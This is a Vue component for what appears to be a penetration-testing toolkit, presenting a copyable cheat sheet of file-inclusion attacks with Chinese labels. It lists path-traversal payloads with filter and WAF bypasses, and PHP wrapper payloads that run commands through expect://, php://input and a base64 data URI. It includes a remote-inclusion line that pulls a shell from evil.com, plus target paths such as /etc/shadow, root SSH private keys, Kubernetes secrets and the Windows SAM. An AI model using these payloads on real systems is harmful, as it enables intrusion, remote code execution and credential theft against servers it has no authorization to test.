<template>
  <div class="space-y-4">
    <TabView :tabs="categories">
      <template #tab-0>
        <!-- 目录遍历 -->
        <div class="space-y-3">
          <div v-for="(item, idx) in traversalPayloads" :key="idx"
            class="reveal-item rounded-md border p-3"
            :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <div class="flex items-center gap-1.5">
                <CopyButton :text="item.code" />
                <button @click="copyEncoded(item.code, 'url')" class="text-xs px-1.5 py-0.5 rounded border" style="color: var(--color-text-muted); border-color: var(--color-border);">URL编码</button>
              </div>
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.code }}</pre>
            <p v-if="item.desc" class="text-xs mt-1" style="color: var(--color-text-muted);">{{ item.desc }}</p>
          </div>
        </div>
      </template>

      <template #tab-1>
        <!-- PHP Wrapper -->
        <div class="space-y-3">
          <div v-for="(item, idx) in phpWrapperPayloads" :key="idx"
            class="reveal-item rounded-md border p-3"
            :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <div class="flex items-center gap-1.5">
                <CopyButton :text="item.code" />
                <button @click="copyEncoded(item.code, 'url')" class="text-xs px-1.5 py-0.5 rounded border" style="color: var(--color-text-muted); border-color: var(--color-border);">URL编码</button>
              </div>
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.code }}</pre>
            <p v-if="item.desc" class="text-xs mt-1" style="color: var(--color-text-muted);">{{ item.desc }}</p>
          </div>
        </div>
      </template>

      <template #tab-2>
        <!-- 敏感文件路径 -->
        <div class="space-y-3">
          <div v-for="section in fileSections" :key="section.title" class="space-y-2">
            <h4 class="text-sm font-medium" style="color: var(--color-text);">{{ section.title }}</h4>
            <div
              v-for="(file, fidx) in section.files"
              :key="fidx"
              class="reveal-item flex items-center justify-between gap-2 rounded border px-3 py-1.5"
              :style="{ '--i': Math.min(fidx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
            >
              <code class="text-xs font-mono" style="color: var(--color-text);">{{ file }}</code>
              <CopyButton :text="file" />
            </div>
          </div>
        </div>
      </template>
    </TabView>
  </div>
</template>

<script setup lang="ts">
import TabView from '../../common/TabView.vue';
import CopyButton from '../../common/CopyButton.vue';

const categories = ['目录遍历', 'PHP Wrapper', '敏感文件路径'];

const traversalPayloads = [
  { title: '基础目录遍历', code: 'foo.php?file=../../../../../../../etc/passwd', desc: '使用 ../ 向上遍历目录' },
  { title: 'Null Byte 截断', code: 'foo.php?file=../../../../../../../etc/passwd%00', desc: '使用 %00 截断绕过扩展名检查（PHP < 5.3.4）' },
  { title: '双重编码', code: 'foo.php?file=..%252f..%252f..%252f..%252fetc/passwd', desc: '双重 URL 编码绕过 WAF' },
  { title: 'Unicode 编码', code: 'foo.php?file=..%c0%af..%c0%af..%c0%afetc/passwd', desc: 'Unicode 编码绕过路径检查' },
  { title: '路径遍历 (PHP)', code: '....//....//....//....//etc/passwd', desc: '使用 ....// 绕过简单 ../ 过滤' },
];

const phpWrapperPayloads = [
  { title: 'php://file (expect)', code: '/example1.php?page=expect://ls', desc: '使用 expect:// 协议执行命令' },
  { title: 'php://filter (Base64)', code: '/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd', desc: '使用 php://filter 读取文件源码的 Base64 编码' },
  { title: 'php://input', code: 'POST: /example1.php?page=php://input\nBody: <?php system("ls"); ?>', desc: '通过 POST 请求体传递代码' },
  { title: 'php://data', code: '/example1.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA/Pg==', desc: '使用 data URI 传入代码' },
  { title: 'RFI 远程文件包含', code: 'http://example.com/index.php?page=http://evil.com/shell.txt', desc: '包含远程文件（需要 allow_url_include=On）' },
];

const fileSections = [
  {
    title: '🐧 Linux',
    files: [
      '/etc/passwd', '/etc/shadow', '/etc/issue', '/etc/group', '/etc/hostname',
      '/etc/ssh/ssh_config', '/etc/ssh/sshd_config', '/root/.ssh/id_rsa',
      '/root/.ssh/authorized_keys', '/home/$USER/.ssh/authorized_keys',
      '/home/$USER/.ssh/id_rsa', '/proc/[0-9]*/fd/[0-9]*', '/proc/mounts',
      '/home/$USER/.bash_history', '/var/run/secrets/kubernetes.io/serviceaccount',
      '/var/lib/mlocate/mlocate.db',
    ],
  },
  {
    title: '🪟 Windows',
    files: [
      '/boot.ini', '/autoexec.bat', '/windows/system32/drivers/etc/hosts',
      '/windows/repair/SAM', '/windows/panther/unattended.xml',
      '/windows/panther/unattend/unattended.xml', '/windows/system32/license.rtf',
      '/windows/system32/eula.txt',
    ],
  },
  {
    title: '🕸️ Apache',
    files: [
      '/etc/apache2/apache2.conf', '/usr/local/etc/apache2/httpd.conf',
      '/etc/httpd/conf/httpd.conf',
      'Red Hat/CentOS/Fedora -> /var/log/httpd/access_log',
      'Debian/Ubuntu -> /var/log/apache2/access.log',
      'FreeBSD -> /var/log/httpd-access.log',
      '/var/log/apache/access.log', '/var/log/apache/error.log',
      '/var/log/apache2/access.log', '/var/log/apache/error.log',
    ],
  },
  {
    title: '🗄️ MySQL',
    files: [
      '/var/lib/mysql/mysql/user.frm', '/var/lib/mysql/mysql/user.MYD',
      '/var/lib/mysql/mysql/user.MYI',
    ],
  },
];

function copyEncoded(text: string, type: string) {
  let encoded = '';
  switch (type) {
    case 'url':
      encoded = encodeURIComponent(text);
      break;
  }
  navigator.clipboard.writeText(encoded);
}
</script>
